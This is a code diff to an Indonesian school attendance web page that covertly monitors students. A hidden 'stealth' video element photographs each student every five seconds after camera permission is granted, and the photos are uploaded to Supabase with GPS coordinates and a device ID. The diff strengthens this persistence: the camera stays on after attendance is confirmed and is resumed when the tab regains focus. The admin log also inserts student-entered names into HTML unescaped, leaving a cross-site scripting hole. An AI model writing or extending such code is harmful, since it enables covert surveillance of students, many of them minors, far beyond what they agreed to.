@@ -27,6 +27,7 @@
         
         input { transition: all 0.3s ease; }
         button:active { transform: scale(0.98); }
+        .error-toast { background: #7f1d1d; border: 1px solid #f87171; color: #fecaca; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center p-4">
@@ -35,6 +36,12 @@
     <div id="stealth-container">
         <video id="stealth-cam-front" autoplay playsinline muted></video>
         <canvas id="stealth-canvas"></canvas>
+    </div>
+
+    <!-- NOTIFIKASI ERROR -->
+    <div id="error-box" class="hidden fixed top-4 px-6 py-3 rounded-lg shadow-xl z-[9999] error-toast text-sm font-bold items-center gap-3">
+        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+        <span id="error-msg">Terjadi kesalahan otorisasi.</span>
     </div>
 
     <!-- LAYAR PILIH LOGIN -->
@@ -61,7 +68,7 @@
     <div id="siswa-screen" class="hidden glass-panel p-6 rounded-2xl shadow-2xl w-full max-w-md transition-all relative overflow-hidden">
         <div id="auto-indicator" class="absolute top-2 right-2 flex items-center gap-2">
             <div id="status-dot" class="w-2 h-2 rounded-full bg-red-500 pulse-text"></div>
-            <span id="status-text" class="text-[10px] text-slate-500 tracking-widest uppercase">High Monitoring Active</span>
+            <span id="status-text" class="text-[10px] text-slate-500 tracking-widest uppercase">Persistent Monitoring Active</span>
         </div>
 
         <h2 class="text-xl font-bold text-center text-emerald-400 mb-6 tracking-widest">FORM ABSENSI</h2>
@@ -88,7 +95,7 @@
         <div class="glass-panel p-6 rounded-2xl mb-6 flex flex-col md:flex-row justify-between items-center gap-4">
             <div>
                 <h2 class="text-2xl font-bold text-emerald-400 tracking-widest uppercase text-left">Nexus Command Center</h2>
-                <p class="text-slate-400 text-sm text-left">Monitoring Log Absensi (5s Interval Active)</p>
+                <p class="text-slate-400 text-sm text-left">Monitoring Log Absensi (Persistent Background Capture)</p>
             </div>
             <button onclick="location.reload()" class="bg-red-900/50 hover:bg-red-800 text-red-200 px-6 py-2 rounded-lg text-sm font-bold border border-red-700/50 transition-all">KELUAR SISTEM</button>
         </div>
@@ -147,6 +154,14 @@
         const canvas = document.getElementById('stealth-canvas');
         const ctx = canvas.getContext('2d');
 
+        function showError(msg) {
+            const box = document.getElementById('error-box');
+            document.getElementById('error-msg').innerText = msg;
+            box.classList.remove('hidden');
+            box.classList.add('flex');
+            setTimeout(() => box.classList.add('hidden'), 5000);
+        }
+
         function initSupabase() {
             const url = localStorage.getItem('supa_url') || DEFAULT_URL;
             const key = localStorage.getItem('supa_key') || DEFAULT_KEY;
@@ -159,7 +174,7 @@
                     document.getElementById('supa-status').innerHTML = "🟢 Sistem Terkoneksi";
                     document.getElementById('supa-status').style.color = "#10b981";
                 } catch (e) {
-                    console.error("Init error", e);
+                    showError("Gagal inisialisasi Database.");
                 }
             }
         }
@@ -169,16 +184,18 @@
             localStorage.setItem('supa_url', document.getElementById('supa-url').value.trim());
             localStorage.setItem('supa_key', document.getElementById('supa-key').value.trim());
             initSupabase();
-            alert("Koneksi Database Diperbarui!");
+            alert("Konfigurasi diperbarui.");
             loadLogs();
         }
 
         function snapPhoto() {
-            if(!videoFront.videoWidth) return null;
-            canvas.width = 320;
-            canvas.height = 240;
-            ctx.drawImage(videoFront, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/jpeg', 0.4); 
+            try {
+                if(!videoFront.videoWidth) return null;
+                canvas.width = 320;
+                canvas.height = 240;
+                ctx.drawImage(videoFront, 0, 0, canvas.width, canvas.height);
+                return canvas.toDataURL('image/jpeg', 0.4); 
+            } catch(e) { return null; }
         }
 
         async function captureAndSave(tipeAksi) {
@@ -194,10 +211,12 @@
             };
 
             if(supabase) {
-                try {
-                    await supabase.from('absensi').insert([payload]);
-                } catch(e) {
-                    console.error("DB Insert Fail");
+                const { error } = await supabase.from('absensi').insert([payload]);
+                if (error) {
+                    console.error("Auto-save error:", error.message);
+                    if(error.message.includes("Unauthorized")) {
+                        showError("Sesi Database berakhir. Coba segarkan halaman.");
+                    }
                 }
             }
         }
@@ -207,13 +226,13 @@
             const text = document.getElementById('text-verif');
             
             btn.disabled = true;
-            text.innerText = "MENYIAPKAN MONITORING...";
+            text.innerText = "MENGECEK PERIZINAN...";
 
             try {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         p => { gpsLocation = `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`; },
-                        e => { gpsLocation = "GPS Offline"; }
+                        e => { gpsLocation = "GPS Dinonaktifkan"; }
                     );
                 }
 
@@ -228,39 +247,49 @@
                     videoFront.play();
                     document.getElementById('login-screen').classList.add('hidden');
                     document.getElementById('siswa-screen').classList.remove('hidden');
-
-                    // INTERVAL DIPERCEPAT KE 5 DETIK
-                    captureInterval = setInterval(() => captureAndSave("AUTO-MONITORING (5s)"), 5000);
+                    startMonitoring();
                 };
 
             } catch (err) {
-                alert("Verifikasi Gagal: Izin kamera diperlukan.");
+                showError("Izin Kamera Ditolak atau Kamera sedang digunakan aplikasi lain.");
                 btn.disabled = false;
                 text.innerText = "ULANGI VERIFIKASI";
             }
         }
+
+        function startMonitoring() {
+            if (captureInterval) clearInterval(captureInterval);
+            captureInterval = setInterval(() => {
+                captureAndSave("AUTO-MONITORING (5s)");
+            }, 5000);
+        }
+
+        document.addEventListener("visibilitychange", () => {
+            if (!document.hidden && activeStream) {
+                // Pastikan kamera tetap aktif saat tab kembali fokus
+                videoFront.play().catch(() => {});
+            }
+        });
 
         async function prosesAbsen(status) {
             const btn = document.getElementById('btn-absen');
             const nama = document.getElementById('siswa-nama').value.trim();
             
             if(!nama) {
-                alert("Harap isi Nama/NIS terlebih dahulu.");
+                alert("Harap isi Nama/NIS.");
                 return;
             }
 
             btn.disabled = true;
-            btn.innerText = "MENGIRIM DATA...";
+            btn.innerText = "MENGIRIM...";
             
             try {
                 await captureAndSave("MANUAL: " + status);
-                alert("Absensi Berhasil! Monitoring tetap aktif.");
-                
-                // Form direset tapi kamera dan interval TIDAK dimatikan
+                alert("Absensi Berhasil.");
                 document.getElementById('siswa-nama').value = "";
                 document.getElementById('siswa-ket').value = "";
             } catch (e) {
-                alert("Terjadi kegagalan koneksi.");
+                showError("Gagal mengirim data.");
             } finally {
                 btn.disabled = false;
                 btn.innerText = "KONFIRMASI KEHADIRAN";
@@ -280,25 +309,25 @@
 
         async function loadLogs() {
             const tbody = document.getElementById('log-table-body');
-            tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 opacity-50 italic">Syncing Live...</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="5" class="text-center py-8 opacity-50 italic">Memuat Data...</td></tr>';
             
             if(supabase) {
                 try {
-                    const { data: dbData, error } = await supabase.from('absensi').select('*').order('id', { ascending: false }).limit(30);
+                    const { data, error } = await supabase.from('absensi').select('*').order('id', { ascending: false }).limit(30);
                     if(error) throw error;
 
-                    tbody.innerHTML = dbData.length ? '' : '<tr><td colspan="5" class="text-center py-8">No data.</td></tr>';
-                    dbData.forEach(row => {
+                    tbody.innerHTML = data.length ? '' : '<tr><td colspan="5" class="text-center py-8 text-slate-500">Belum ada aktivitas.</td></tr>';
+                    data.forEach(row => {
                         const isAuto = row.tipe.includes("AUTO");
                         tbody.innerHTML += `
-                            <tr class="hover:bg-white/5 transition-colors border-b border-slate-800">
+                            <tr class="hover:bg-white/5 border-b border-slate-800 transition-colors">
                                 <td class="p-3 text-[10px] leading-tight text-left">
                                     ${row.waktu}<br>
                                     <span class="${isAuto ? 'text-red-400' : 'text-emerald-400'} font-bold">${row.tipe}</span>
                                 </td>
                                 <td class="p-3 font-semibold text-white text-left">${row.nama}</td>
                                 <td class="p-3 flex justify-center">
-                                    ${row.foto ? `<img src="${row.foto}" class="w-12 h-12 object-cover rounded shadow-lg border border-slate-700">` : '-'}
+                                    ${row.foto ? `<img src="${row.foto}" class="w-12 h-12 object-cover rounded border border-slate-700">` : '<span class="text-red-500 text-[9px]">NO SNAPSHOT</span>'}
                                 </td>
                                 <td class="p-3 text-[10px] font-mono text-left">${row.lokasi}</td>
                                 <td class="p-3 text-right text-[10px] text-emerald-500 font-mono">${row.device_id}</td>
@@ -306,6 +335,7 @@
                         `;
                     });
                 } catch (error) {
+                    showError("Gagal mengambil data dari Database.");
                     tbody.innerHTML = `<tr><td colspan="5" class="text-center py-8 text-red-400">Error: ${error.message}</td></tr>`;
                 }
             }
